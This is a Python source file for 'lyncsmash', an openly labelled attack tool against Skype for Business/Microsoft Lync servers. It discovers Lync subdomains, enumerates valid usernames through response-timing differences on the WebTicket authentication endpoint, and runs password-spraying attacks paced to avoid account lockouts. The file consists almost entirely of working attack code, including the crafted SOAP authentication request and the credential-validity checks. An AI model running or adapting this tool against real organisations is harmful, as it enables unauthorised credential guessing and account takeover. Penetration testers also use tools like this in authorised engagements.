#!/usr/bin/env python

"""
lyncsmash - Tool for enumerating and attacking Skype for Business/Microsoft Lync installations

This tool provides three main attack modes:
1. discover - Find Lync/Skype for Business subdomains
2. enum     - Enumerate valid usernames using timing attacks  
3. spray    - Perform password spraying attacks with account lockout protection

Examples:
    # Discover Lync subdomains
    python lyncsmash.py discover -H company.com
    
    # Enumerate usernames with single password
    python lyncsmash.py enum -H lync.company.com -U users.txt -d DOMAIN -p Password123 -o results.log
    
    # Password spray with lockout protection
    python lyncsmash.py spray -H lync.company.com -U users.txt -d DOMAIN -P passwords.txt -a 3 -delay 30 -s 1
"""

import argparse
import base64
import os
import string
import random
import requests
import datetime
import time
import uuid
from collections import defaultdict

try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

# Global variables
outputfile = "lyncsmash.log"
validCred = False
isDisabled = False
timeout = 1.00
apSleep = 0
user_attempts = defaultdict(int)
user_lockouts = defaultdict(float)

def main():
    global outputfile, apSleep, timeout
    
    parser = argparse.ArgumentParser(
        description='LyncSmash - Attack tool for Skype for Business/Microsoft Lync',
        epilog='''
Examples:
  Discover Lync subdomains:
    %(prog)s discover -H company.com

  Enumerate valid usernames:
    %(prog)s enum -H lync.company.com -U users.txt -d DOMAIN -p Password123 -o results.log

  Password spray with lockout protection:
    %(prog)s spray -H lync.company.com -U users.txt -d DOMAIN -P passwords.txt -a 3 -delay 30 -s 1
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    subparsers = parser.add_subparsers(dest='attack', help='Attack mode')

    # Discover parser
    discover_parser = subparsers.add_parser('discover', 
        help='Discover Lync/Skype for Business subdomains',
        description='Scan for common Lync/Skype for Business subdomains to identify the target infrastructure')
    discover_parser.add_argument('-H', dest='host', required=True,
        help='Target domain (e.g., company.com)')

    # Enum parser
    enum_parser = subparsers.add_parser('enum',
        help='Enumerate valid usernames using timing attacks',
        description='Use response time differences to identify valid usernames. Valid users typically respond faster than invalid ones.')
    enum_parser.add_argument('-H', dest='host', required=True,
        help='Lync server hostname (e.g., lync.company.com)')
    enum_parser.add_argument('-U', dest='usernames', required=True,
        help='File containing usernames (one per line)')
    enum_parser.add_argument('-d', dest='domain', required=True,
        help='Internal domain name (e.g., COMPANY)')
    enum_parser.add_argument('-r', action='store_true', dest='randomize', 
        help='Randomize the order of usernames from input file')
    enum_parser.add_argument('-p', dest='passwd', 
        help='Single password to test against all users')
    enum_parser.add_argument('-P', dest='passwdfile',
        help='File containing passwords to test (one per line)')
    enum_parser.add_argument('-o', dest='outfile',
        help='Output file for results (default: lyncsmash.log)')
    enum_parser.add_argument('-t', dest='time_avg', type=float,
        help='Known average response time for invalid users (auto-calculated if not provided)')
    enum_parser.add_argument('-s', dest='sleep', type=float,
        help='Sleep time between requests in seconds (default: 0)')
    
    # Spray parser
    spray_parser = subparsers.add_parser('spray',
        help='Password spray attack with account lockout protection',
        description='''Perform password spraying while preventing account lockouts.
        The tool will automatically pause when users reach the attempt limit and resume after the delay period.''')
    spray_parser.add_argument('-H', dest='host', required=True,
        help='Lync server hostname (e.g., lync.company.com)')
    spray_parser.add_argument('-U', dest='usernames', required=True,
        help='File containing usernames (one per line)')
    spray_parser.add_argument('-d', dest='domain', required=True,
        help='Internal domain name (e.g., COMPANY)')
    spray_parser.add_argument('-P', dest='passwdfile', required=True,
        help='File containing passwords to spray (one per line)')
    spray_parser.add_argument('-a', dest='attempts', type=int, default=3,
        help='Max authentication attempts per user before delay (default: 3)')
    spray_parser.add_argument('-delay', dest='delay', type=int, default=35,
        help='Delay time in minutes after max attempts reached (default: 35)')
    spray_parser.add_argument('-o', dest='outfile',
        help='Output file for results (default: lyncsmash.log)')
    spray_parser.add_argument('-s', dest='sleep', type=float, default=0,
        help='Sleep time between requests in seconds (default: 0)')

    args = parser.parse_args()

    if not args.attack:
        parser.print_help()
        return

    if args.attack == 'discover':
        subdomain_count, findings = discover_lync(args.host)
        print_good("Found {0} Lync subdomains - {1} Lync".format(subdomain_count, findings))

    elif args.attack == 'enum':
        if (args.passwd, args.passwdfile) == (None, None):
            print_error('You need to specify either a password (-p) or a password file (-P)')
            exit()
        if all((args.passwd, args.passwdfile)):
            print_error('You cannot specify both -p and -P')
            exit()
        
        if args.outfile is None:
            print_error("Output file not specified, using 'lyncsmash.log'")
        else:
            outputfile = args.outfile
            
        if args.sleep is not None:
            apSleep = args.sleep
            
        if os.path.isfile(args.usernames):
            if args.time_avg is not None:
                timeout = args.time_avg
            else:
                timeout = baseline_timeout(args.host, args.domain)
            if timeout:
                print_status("Average timeout is: {0}".format(timeout))
                if args.passwd is not None:
                    timing_attack(args.host.rstrip(), args.usernames.rstrip(), args.passwd.rstrip(), args.domain.rstrip(), args.randomize)
                if args.passwdfile is not None:
                    with open(args.passwdfile) as pass_file:
                        for password in pass_file:
                            timing_attack(args.host.rstrip(), args.usernames.rstrip(), password.rstrip(), args.domain.rstrip(), args.randomize)
        else:
            print_error('Could not find username file')

    elif args.attack == 'spray':
        if args.outfile is not None:
            outputfile = args.outfile
        if args.sleep is not None:
            apSleep = args.sleep
        
        if os.path.isfile(args.usernames) and os.path.isfile(args.passwdfile):
            spray_attack(args.host.rstrip(), args.usernames.rstrip(), args.passwdfile.rstrip(), 
                       args.domain.rstrip(), args.attempts, args.delay)
        else:
            print_error('Could not find username file or password file')

def spray_attack(host, userfilepath, passwdfilepath, domain, max_attempts, delay_minutes):
    global outputfile, apSleep, user_attempts, user_lockouts, validCred
    
    print_status("Starting password spray attack")
    print_status("Max attempts per user: {0}".format(max_attempts))
    print_status("Delay after max attempts: {0} minutes".format(delay_minutes))
    
    with open(os.path.abspath(userfilepath)) as user_file:
        user_list = [line.strip() for line in user_file]
    
    with open(os.path.abspath(passwdfilepath)) as pass_file:
        password_list = [line.strip() for line in pass_file]
    
    print_status("Loaded {0} users and {1} passwords".format(len(user_list), len(password_list)))
    
    with open((os.path.abspath(outputfile)), "a") as f:
        currenttime = datetime.datetime.now()
        f.write("Started lyncsmash spray attack at {0}\n".format(currenttime))
        
        password_index = 0
        
        while password_index < len(password_list):
            password = password_list[password_index]
            print_status("Trying password #{0}: '{1}'".format(password_index + 1, password))
            
            valid_users_this_round = []
            attempted_count = 0
            
            # Get currently available users
            current_time = time.time()
            available_users = []
            
            for user in user_list:
                # Skip if user is locked
                if user in user_lockouts:
                    lock_time = user_lockouts[user]
                    if current_time - lock_time < delay_minutes * 60:
                        continue
                    else:
                        # Lock expired, remove from lockouts
                        del user_lockouts[user]
                
                # Skip if user reached max attempts
                if user_attempts[user] >= max_attempts:
                    if user not in user_lockouts:
                        user_lockouts[user] = current_time
                    continue
                    
                available_users.append(user)
            
            if not available_users:
                print_warn("All users are locked. Waiting for unlock...")
                
                # Find the earliest unlock time
                earliest_unlock = None
                for user, lock_time in user_lockouts.items():
                    unlock_time = lock_time + (delay_minutes * 60)
                    if earliest_unlock is None or unlock_time < earliest_unlock:
                        earliest_unlock = unlock_time
                
                if earliest_unlock:
                    wait_time = max(1, earliest_unlock - current_time)
                    wait_minutes = int(wait_time // 60)
                    
                    print_warn("Waiting {0} minutes for next unlock...".format(wait_minutes))
                    
                    # Wait with progress updates
                    start_wait = time.time()
                    last_displayed_minutes = wait_minutes
                    
                    while time.time() - start_wait < wait_time:
                        elapsed = time.time() - start_wait
                        remaining = wait_time - elapsed
                        current_minutes = int(remaining // 60)
                        
                        # Update display only when minutes change
                        if current_minutes != last_displayed_minutes:
                            print_status("Waiting... {0}m remaining".format(current_minutes))
                            last_displayed_minutes = current_minutes
                            
                        time.sleep(1)
                    
                    print_status("Resuming attack...")
                    continue
                else:
                    print_error("No unlock time found. Exiting.")
                    break
            
            # Process available users
            for user in available_users:
                try:
                    time.sleep(apSleep)
                    response_time = send_xml_spray(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
                    attempted_count += 1
                    
                    if validCred:
                        status = "VALID CREDENTIALS: {0}, Password: {1}".format(user.rstrip(), password.rstrip())
                        print_good(status)
                        f.write("[!] {0}\n".format(status))
                        valid_users_this_round.append(user)
                    else:
                        status = "INVALID: {0}, Password: {1}".format(user.rstrip(), password.rstrip())
                        print_error(status)
                        f.write("[-] {0}\n".format(status))
                    
                    user_attempts[user] += 1
                    
                    # Check if user reached max attempts
                    if user_attempts[user] >= max_attempts:
                        user_lockouts[user] = time.time()
                        
                except Exception as e:
                    print_error("Error testing {0}: {1}".format(user, str(e)))
            
            # Remove users with valid credentials
            for valid_user in valid_users_this_round:
                if valid_user in user_list:
                    user_list.remove(valid_user)
                    print_good("Removed {0} from further attempts".format(valid_user))
            
            # Update stats
            current_time = time.time()
            active_count = len([u for u in user_list if user_attempts.get(u, 0) < max_attempts and 
                              (u not in user_lockouts or current_time - user_lockouts[u] >= delay_minutes * 60)])
            locked_count = len([u for u in user_list if u in user_lockouts and current_time - user_lockouts[u] < delay_minutes * 60])
            
            print_status("Progress: {0} active, {1} locked, {2} attempted this round".format(
                active_count, locked_count, attempted_count))
            
            # Move to next password only if we made attempts
            if attempted_count > 0:
                password_index += 1
            else:
                # No attempts made, short wait and retry
                time.sleep(5)
            
            # Check completion
            if not user_list:
                print_good("All users processed")
                break
        
        endtime = datetime.datetime.now()
        elapsed_time = endtime - currenttime
        f.write("Finished spray attack at {0}\n".format(endtime))
        f.write("Elapsed time: {0}\n".format(elapsed_time))

def send_xml_spray(host, domain, user, passwd):
    """Version for spray attack without time display"""
    global validCred, isDisabled
    
    domain_user = "{0}\\{1}".format(domain, user)
    encoded_username = base64.b64encode(domain_user.encode()).decode()
    encoded_password = base64.b64encode(passwd.encode()).decode()

    created_time = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')
    expires_time = (datetime.datetime.now() + datetime.timedelta(minutes=15)).strftime('%Y-%m-%dT%H:%M:%SZ')
    context_str = str(uuid.uuid4())

    lync_url = "https://{0}/WebTicket/WebTicketService.svc/Auth".format(host)
    
    xml_data = """<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Header><Security s:mustUnderstand="1" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
    <UsernameToken><Username>{0}</Username><Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">{1}</Password></UsernameToken></Security></s:Header>
    <s:Body><RequestSecurityToken xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" Context="{2}" xmlns="http://docs.oasis-open.org/ws-sx/ws-trust/200512">
    <TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType>
    <RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType>
    <AppliesTo xmlns="http://schemas.xmlsoap.org/ws/2004/09/policy"><EndpointReference xmlns="http://www.w3.org/2005/08/addressing"><Address>{3}</Address></EndpointReference></AppliesTo>
    <Lifetime><Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">{4}</Created>
    <Expires xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">{5}</Expires></Lifetime>
    <KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>""".format(
        encoded_username, encoded_password, context_str, lync_url, created_time, expires_time)

    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'User-Agent': 'UCCAPI/16.0.13328.20130 OC/16.0.13426.20234'
    }
    
    try:
        response = requests.post(lync_url, headers=headers, data=xml_data, verify=False, timeout=10)
        
        if 'No valid' in response.text:
            validCred = False
            isDisabled = False
        elif 'account is disabled' in response.text:
            validCred = False
            isDisabled = True
        else:
            validCred = True
            isDisabled = False
            
        response_time = str(response.elapsed.total_seconds())
        
        if response.status_code == 200:
            print_success(domain_user, passwd)
        elif response.status_code == 404:
            print_error('404 Not Found')
            return None
        elif response.status_code == 403:
            print_error('403 Forbidden')
            return None
        elif response.status_code == 401:
            print_error('401 Unauthorized')
            return None
            
        return response_time
        
    except Exception as e:
        print_error("Request failed: {0}".format(str(e)))
        return None

def send_xml(host, domain, user, passwd):
    """Original version for enum attack with time display"""
    global validCred, isDisabled
    
    domain_user = "{0}\\{1}".format(domain, user)
    encoded_username = base64.b64encode(domain_user.encode()).decode()
    encoded_password = base64.b64encode(passwd.encode()).decode()

    created_time = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')
    expires_time = (datetime.datetime.now() + datetime.timedelta(minutes=15)).strftime('%Y-%m-%dT%H:%M:%SZ')
    context_str = str(uuid.uuid4())

    lync_url = "https://{0}/WebTicket/WebTicketService.svc/Auth".format(host)
    
    xml_data = """<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Header><Security s:mustUnderstand="1" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
    <UsernameToken><Username>{0}</Username><Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">{1}</Password></UsernameToken></Security></s:Header>
    <s:Body><RequestSecurityToken xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" Context="{2}" xmlns="http://docs.oasis-open.org/ws-sx/ws-trust/200512">
    <TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType>
    <RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType>
    <AppliesTo xmlns="http://schemas.xmlsoap.org/ws/2004/09/policy"><EndpointReference xmlns="http://www.w3.org/2005/08/addressing"><Address>{3}</Address></EndpointReference></AppliesTo>
    <Lifetime><Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">{4}</Created>
    <Expires xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">{5}</Expires></Lifetime>
    <KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>""".format(
        encoded_username, encoded_password, context_str, lync_url, created_time, expires_time)

    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'User-Agent': 'UCCAPI/16.0.13328.20130 OC/16.0.13426.20234'
    }
    
    try:
        response = requests.post(lync_url, headers=headers, data=xml_data, verify=False, timeout=10)
        
        if 'No valid' in response.text:
            validCred = False
            isDisabled = False
        elif 'account is disabled' in response.text:
            validCred = False
            isDisabled = True
        else:
            validCred = True
            isDisabled = False
            
        response_time = str(response.elapsed.total_seconds())
        
        if response.status_code == 200:
            print_success(domain_user, passwd)
        elif response.status_code == 404:
            print_error('404 Not Found')
            return None
        elif response.status_code == 403:
            print_error('403 Forbidden')
            return None
        elif response.status_code == 401:
            print_error('401 Unauthorized')
            return None
            
        return response_time
        
    except Exception as e:
        print_error("Request failed: {0}".format(str(e)))
        return None

def discover_lync(host):
    indicator_count = 0
    subdomains = [
        ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(20)),
        'dialin', 'meet', 'lyncdiscover', 'scheduler', 'access', 'lync',
        'lyncext', 'lyncaccess01', 'lyncaccess', 'lync10', 'lyncweb',
        'sip', 'lyncdiscoverinternal'
    ]

    for subdomain in subdomains:
        lync_url = "https://{0}.{1}".format(subdomain, host)
        print_status("Trying {0}.{1}".format(subdomain, host))
        try:
            response = requests.get(lync_url, timeout=3, verify=False)
            if response.status_code in [200, 403]:
                if subdomain == subdomains[0]:
                    print_warn('Found Wildcard domain')
                    break
                else:
                    print_good("Found Lync domain {0}.{1}".format(subdomain, host))
                    indicator_count += 1
        except:
            continue

    switch = {0: 'No', 1: 'Maybe', 2: 'Probably', 3: 'Almost definitely'}
    return indicator_count, switch.get(indicator_count, 'Definitely')

def timing_attack(host, userfilepath, password, domain, randomize):
    global outputfile, apSleep, timeout, validCred, isDisabled

    with open((os.path.abspath(outputfile)), "a") as f:
        currenttime = datetime.datetime.now()
        f.write("Started timing attack at {0}\n".format(currenttime))
        
        with open(os.path.abspath(userfilepath)) as user_file:
            user_list = [line.strip() for line in user_file]
            if randomize:
                random.shuffle(user_list)
                
            for user in user_list:
                try:
                    time.sleep(apSleep)
                    response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
                    candidatevalue = float(response_time) / timeout
                    
                    if candidatevalue <= 0.4:
                        if isDisabled:
                            status = "VALID USER (DISABLED): {0}, Password: {1}, Time: {2}".format(user, password, response_time)
                            print_error(status)
                            f.write("[*] {0}\n".format(status))
                        elif validCred:
                            status = "VALID CREDENTIALS: {0}, Password: {1}, Time: {2}".format(user, password, response_time)
                            print_good(status)
                            f.write("[!] {0}\n".format(status))
                        else:
                            status = "VALID USER: {0}, Password: {1}, Time: {2}".format(user, password, response_time)
                            print_good(status)
                            f.write("[+] {0}\n".format(status))
                    else:
                        status = "INVALID USER: {0}, Password: {1}, Time: {2}".format(user, password, response_time)
                        print_error(status)
                        f.write("[-] {0}\n".format(status))
                except Exception as e:
                    pass

        endtime = datetime.datetime.now()
        elapsed_time = endtime - currenttime
        f.write("Finished at {0}, Elapsed: {1}\n".format(endtime, elapsed_time))

def baseline_timeout(host, domain):
    print_status("Performing baseline tests...")
    response_times = []
    
    for i in range(3):
        try:
            random_user = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
            response_time = send_xml(host, domain, random_user, "n0t_y0ur_p4ss")
            if response_time:
                print_status("Test #{0} time: {1}".format(i+1, response_time))
                response_times.append(float(response_time))
        except Exception as e:
            continue

    return sum(response_times) / len(response_times) if response_times else 1.0

def print_success(username, password):
    print("\033[1m\033[32m[+]\033[0m VALID: {0} : {1}".format(username, password))

def print_error(msg):
    print("\033[1m\033[31m[-]\033[0m {0}".format(msg))

def print_status(msg):
    print("\033[1m\033[34m[*]\033[0m {0}".format(msg))

def print_good(msg):
    print("\033[1m\033[32m[+]\033[0m {0}".format(msg))

def print_warn(msg):
    print("\033[1m\033[33m[!]\033[0m {0}".format(msg))

if __name__ == '__main__':
    main()
